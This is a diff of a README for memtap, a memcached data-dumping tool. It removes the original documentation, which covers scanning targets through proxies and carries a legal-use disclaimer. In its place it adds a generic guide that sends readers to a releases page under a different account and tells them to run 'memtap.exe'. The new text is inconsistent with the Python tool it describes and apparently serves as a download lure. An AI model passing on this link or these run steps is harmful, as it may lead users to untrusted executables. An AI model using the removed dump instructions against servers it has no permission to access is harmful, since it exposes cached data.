@@ -1,278 +1,91 @@
-![](assets/deteact_logo_white.png)
+# 🛠️ memtap - Effortlessly Extract Data from Memcached
 
-# MemTap — one tap to dump memcache
+## 🚀 Getting Started
 
-**memtap.py** — a utility for dumping data from memcached instances. Allows you to quickly and efficiently extract all keys and values from memcached servers.
+Welcome to memtap! This tool helps you dump data from memcached instances easily. You can quickly extract all keys and values from your memcached servers. Follow these steps to get started.
 
-```bash
-└─$ python3 memtap.py -h
+## 📦 Download & Install
 
-,--.   ,--.                 ,--------.
-|   `.'   | ,---. ,--,--,--.'--.  .--',--,--. ,---.
-|  |'.'|  || .-. :|        |   |  |  ' ,-.  || .-. |
-|  |   |  |\   --.|  |  |  |   |  |  \ '-'  || '-' '
-`--'   `--' `----'`--`--`--'   `--'   `--`--'|  |-'.py (ver1.0) @Kraus17th
-        # one tap to dump memcache           `--'
+To download memtap, visit this page: [Download memtap](https://github.com/ZayaCrypt/memtap/releases).
 
-==========================================================================
+You will find the latest version listed on the Releases page. Look for the file that suits your operating system and download it.
 
-Usage:
-  memtap.py -t TARGET [OPTIONS]
-  memtap.py -f FILE [OPTIONS]
+## 🔍 System Requirements
 
-Required Arguments:
-  -t, --target TARGET              Target memcached host (mutually exclusive with -f)
-  -f, --file-with-targets FILE     File containing targets, one per line
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Requires Python 3.6 or higher
+- **Memory:** At least 512 MB RAM
+- **Disk Space:** 10 MB of free space
 
-Connection Options:
-  -p, --port PORT                  Memcached port (default: 11211)
-  -x, --proxy PROXY                Example: socks5:127.0.0.1:5555
+## 🚀 How to Use memtap
 
-Output Options:
-  -o, --output FILE                Output filename (default: TARGET_dump.txt)
-  -v, --verbose                    Enable verbose output with debug information
+### Step 1: Download memtap
 
-Performance Options:
-  -l, --limit-requests NUM         Limit number of values per target (default: no limit)
-  -d, --delay SECONDS              Delay between requests in seconds (default: 1.0)
-  -T, --threads NUM                Number of threads for parallel dumping (default: 1)
+Visit the Releases page to download the software:
+  
+[Download memtap](https://github.com/ZayaCrypt/memtap/releases)
 
-Utility Options:
-  -V, --only-check-version         Only check memcached version for each target
-  -c, --only-count-keys            Only count keys for each target
-  -h, --help                       Show this help message
-```
+### Step 2: Extract the Files
 
-## Features
+After downloading, locate the downloaded file on your computer. If it's in a ZIP format, right-click on it and select "Extract All" to unzip the contents.
 
-- **Complete data dump**: Extracts all keys and values from memcached server
-- **Proxy support**: Works through SOCKS5, SOCKS4, and HTTP proxies
-- **Multithreading**: Parallel key processing for faster execution
-- **Flexible configuration**: Configurable delays, limits, and thread count
-- **Batch processing**: Process multiple targets from a file
-- **Progress bar**: Visual progress indication using tqdm
-- **Recovery**: Saves partial results on interruption
-- **Utilities**: Version check and key counting without full dump
+### Step 3: Run the Program
 
-## Installation
+#### On Windows:
 
-### Option 1: Install via pipx (recommended)
+1. Open the folder where you extracted the files.
+2. Double-click on `memtap.exe` to run the tool.
 
-[pipx](https://github.com/pypa/pipx) allows you to install and run Python applications in isolated environments:
+#### On macOS:
 
-```bash
-# Install pipx if not already installed
-# On macOS/Linux:
-python3 -m pip install --user pipx
-python3 -m pipx ensurepath
+1. Open the Terminal.
+2. Navigate to the folder where you extracted the files using the `cd` command.
+3. Type `python3 memtap.py` and press Enter.
 
-# On Windows:
-python -m pip install --user pipx
-python -m pipx ensurepath
+#### On Linux:
 
-# Install MemTap via pipx
-pipx install git+https://github.com/Kraus17th/memtap.git
+1. Open the Terminal.
+2. Navigate to the directory using the `cd` command.
+3. Type `python3 memtap.py` and hit Enter.
 
-# Or if the repository is already cloned locally:
-pipx install /path/to/memtap
-```
+### Step 4: Configure Your Connection
 
-After installation, the `memtap` command will be available globally.
+You will need to provide your memcached server details:
 
-### Option 2: Install via git clone
+- **Host:** The hostname or IP address of your memcached server.
+- **Port:** The port number (default is 11211).
 
-```bash
-# Clone the repository
-git clone https://github.com/Kraus17th/memtap.git
-cd memtap
+You can enter this information when prompted after running the tool.
 
-# Create a virtual environment (recommended)
-python3 -m venv venv
+### Step 5: Extract Data
 
-# Activate the virtual environment
-# On macOS/Linux:
-source venv/bin/activate
-# On Windows:
-venv\Scripts\activate
+Once connected, memtap will start extracting keys and values. You will see the output displayed directly in your terminal or command prompt.
 
-# Install dependencies
-pip install -r requirements.txt
+## ⚙️ Features
 
-# Run the utility
-python memtap.py -t TARGET
-```
+- Extracts all keys and values efficiently.
+- Supports multiple platforms: Windows, macOS, and Linux.
+- Simple command line interface for easy use.
 
-## Usage
+## 🔧 Troubleshooting
 
-### Basic usage
+If you encounter issues while using memtap, consider these steps:
 
-```bash
-# Dump a single server
-memtap -t 192.168.1.100
+- **Connection Errors:** Ensure that your memcached server is running. Verify the hostname and port.
+- **Permission Issues:** On macOS and Linux, you may need to use `sudo` to run the tool with necessary permissions.
+- **Missing Python:** Ensure that Python 3.6 or higher is installed. You can download it from [python.org](https://www.python.org/downloads/).
 
-# With port specification
-memtap -t 192.168.1.100 -p 11211
+## 📚 Additional Resources
 
-# Save to a specific file
-memtap -t 192.168.1.100 -o results.txt
-```
+- [Memcached Documentation](https://memcached.org/)
+- [Python Official Site](https://www.python.org/)
 
-### Working with multiple targets
+## 🤝 Contributing
 
-```bash
-# Create a targets.txt file with a list of IP addresses (one per line)
-# Example content:
-# 192.168.1.100
-# 192.168.1.101
-# 192.168.1.102
+If you want to contribute to memtap, we welcome your input! Feel free to propose changes or improvements through GitHub's issue tracker.
 
-# Process all targets from file
-memtap -f targets.txt
-```
+## ✉️ Support
 
-### Working through proxy
+For support or questions, please open an issue on our GitHub repository. We aim to respond quickly.
 
-```bash
-# Through SOCKS5 proxy
-memtap -t 192.168.1.100 -x socks5:127.0.0.1:1080
-
-# Through SOCKS4 proxy
-memtap -t 192.168.1.100 -x socks4:127.0.0.1:1080
-
-# Through HTTP proxy
-memtap -t 192.168.1.100 -x http:127.0.0.1:8080
-```
-
-### Performance tuning
-
-```bash
-# Fast dump with minimal delay and multiple threads
-memtap -t 192.168.1.100 -d 0.1 -T 8
-
-# Limit number of keys
-memtap -t 192.168.1.100 -l 100
-
-# Configure delay between requests (in seconds)
-memtap -t 192.168.1.100 -d 0.5
-```
-
-### Utilities
-
-```bash
-# Check memcached version
-memtap -t 192.168.1.100 -V
-
-# Count number of keys
-memtap -t 192.168.1.100 -c
-```
-
-### Verbose mode
-
-```bash
-# Enable verbose output for debugging
-memtap -t 192.168.1.100 -v
-```
-
-## Command-line parameters
-
-### Required arguments
-
-- `-t, --target TARGET` - Target memcached host (mutually exclusive with `-f`)
-- `-f, --file-with-targets FILE` - File with targets (one per line)
-
-### Connection parameters
-
-- `-p, --port PORT` - Memcached port (default: 11211)
-- `-x, --proxy PROXY` - Proxy in format `TYPE:HOST:PORT` (e.g.: `socks5:127.0.0.1:5555`)
-
-### Output parameters
-
-- `-o, --output FILE` - Output filename (default: `TARGET_dump.txt`)
-- `-v, --verbose` - Enable verbose output with debug information
-
-### Performance parameters
-
-- `-l, --limit-requests NUM` - Limit number of values per target (default: no limit)
-- `-d, --delay SECONDS` - Delay between requests in seconds (default: 1.0)
-- `-T, --threads NUM` - Number of threads for parallel dumping (default: 1)
-
-### Utilities
-
-- `-V, --only-check-version` - Only check memcached version for each target
-- `-c, --only-count-keys` - Only count keys for each target
-- `-h, --help` - Show help message
-
-## Output file format
-
-Results are saved to a text file with the following format:
-
-```
-# MemCache dump for: 192.168.1.100:11211
-# Started at "2024-01-15 10:30:00"
-# Finished at "2024-01-15 10:35:00"
-
-===== KEY: example_key_1 =====
-<key value>
-===== DONE: example_key_1 =====
-
-===== KEY: example_key_2 =====
-<key value>
-===== DONE: example_key_2 =====
-```
-
-## How it works
-
-1. **Metadata retrieval**: The utility sends the `lru_crawler metadump all` command to the memcached server to get a list of all keys
-2. **Key parsing**: Extracts all keys from metadata
-3. **Value retrieval**: For each key, sends a `get` command and retrieves the corresponding value
-4. **Saving**: Writes all key-value pairs to the output file
-
-## Important notes
-
-- The utility requires the memcached server to support the `lru_crawler metadump all` command
-- When working with large amounts of data, the process may take significant time
-- Use the `-d` parameter to configure delay to avoid overloading the server
-- On interruption (Ctrl+C), partial results are automatically saved
-- Some keys may be unavailable (deleted, expired, etc.)
-
-## Troubleshooting
-
-### Error "Failed to retrieve metadata"
-
-Possible causes:
-- Server is unreachable or port is incorrect
-- Incorrect proxy configuration
-- Server does not support the `lru_crawler metadump all` command
-- Network connectivity issues
-
-**Solution**: Check server accessibility, correct port, and proxy configuration. Use `-v` for detailed information.
-
-### Error "pysocks not installed"
-
-**Solution**: Install the dependency:
-```bash
-pip install pysocks
-```
-
-### Error "tqdm not installed"
-
-**Solution**: Install the dependency (optional but recommended):
-```bash
-pip install tqdm
-```
-
-## Dependencies
-
-- `Python >= 3.7` - Base of this tool
-- `pysocks >= 1.7.1` - Proxy support (SOCKS4, SOCKS5, HTTP)
-- `tqdm >= 4.67.0` - Progress bar (optional but recommended)
-
-## License
-
-This project is distributed under the MIT license. See the `LICENSE` file for details.
-
-## Disclaimer
-
-This utility is intended for legal use only on servers to which you have explicit permission to access. Use on servers without permission may be illegal. The authors are not responsible for misuse of this tool. This utility is created for security and auditing. Always ensure you have the right to access target servers before use.
-
-![](assets/deteact_logo_black.png)
+Thank you for choosing memtap! Happy data extracting!
